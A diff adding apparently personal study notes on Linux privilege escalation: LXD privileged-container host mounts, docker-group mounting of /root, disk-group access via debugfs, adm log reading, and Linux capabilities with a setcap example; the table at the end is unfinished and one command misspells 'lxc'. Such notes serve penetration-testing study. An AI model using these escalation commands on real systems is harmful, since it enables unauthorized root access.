@@ -71,4 +71,28 @@ The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binarie
 4. Import local image : `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
 5. Start a privileged container : `lxc init alpine [name] -c security.privileged=true`
 6. Mount the host filesystem : `lsx config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
-7. 
+7. Start the container : `lxc start [name]`
+8. Exec into the container : `lxc exec [name] /bin/sh`
+
+### Docker
+The docker group is essentially root access to the file system without a password. Members can create new docker containers and mount the file system: `docker run -v /root:/mnt -it ubuntu`
+
+### Disk
+Users in the `disk` group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device. An attacker with these privileges can use `debugfs` to access the entire filesystem with root access.
+
+### ADM
+The `adm` group is able to read all logs in `/var/log`, this could lead to sensitive information disclosure.
+
+## Capabilities
+Linux capabilities are a security feature that allows the OS to give specific privileges to processes. We can sometimes grant capabilities to processes that aren't adequately sandboxed or isolated, allowing for privileges to be escalated.
+
+Ubuntu has the `setcap` command for setting capabilities for an executable.
+```bash
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+```
+
+Some useful capabilities are:
+
+| Capability | Description |
+| ---------- | ----------- |
+| `cap_`     |             |
